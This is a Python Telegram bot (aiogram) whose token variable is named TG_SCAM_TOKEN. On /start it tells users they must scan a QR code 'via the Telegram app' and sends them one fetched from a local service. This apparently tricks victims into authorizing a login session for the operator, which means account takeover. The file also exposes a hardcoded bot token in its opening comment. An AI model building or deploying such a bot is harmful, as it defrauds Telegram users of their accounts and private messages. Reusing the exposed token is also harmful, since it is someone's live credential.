# 7025713719:AAFSZLKEZyVcqoSQWJNHMZhRrkEOqJFZs-U
import asyncio
import logging

from aiogram import Bot, Dispatcher, Router, types
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart
from aiogram.types import Message, FSInputFile
from aiogram.utils.markdown import hbold
from aiogram.client.bot import DefaultBotProperties
import os
import dotenv
import requests

dotenv.load_dotenv()
TOKEN = os.getenv("TG_SCAM_TOKEN")
dp = Dispatcher()
bot = Bot(TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))


# Старт
@dp.message(CommandStart())
async def command_start_handler(message: Message) -> None:
    await message.answer(f"Привет, {hbold(message.from_user.full_name)}, чтобы начать пользоватся ботом нужно отсканировать данный QR код через приложение Telegram!\n❌ При ошибке напишите /start повторно!")
    with open("./lastQr.png", "wb") as q:
        link = requests.get("http://127.0.0.1:8080/getQR").text
        qr = requests.get(f"http://127.0.0.1:8080/gen&{link}").content
        # print(qr)
        q.write(qr)
        await message.answer_photo(FSInputFile("./lastQr.png"))

# Ну бля туда сюда
@dp.message()
async def echo_handler(message: Message) -> None:
    await message.answer("❌У меня нету такой команды")

# Запуск бота
async def main() -> None:
    # Initialize Bot instance with a default parse mode which will be passed to all API calls
    print(" Bot by: Belka x Straineeq x Govnocode [Started]")
    # And the run events dispatching
    await dp.start_polling(bot)

# Залупа
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO , stream=open("./Logs.txt", "w"))
    asyncio.run(main())

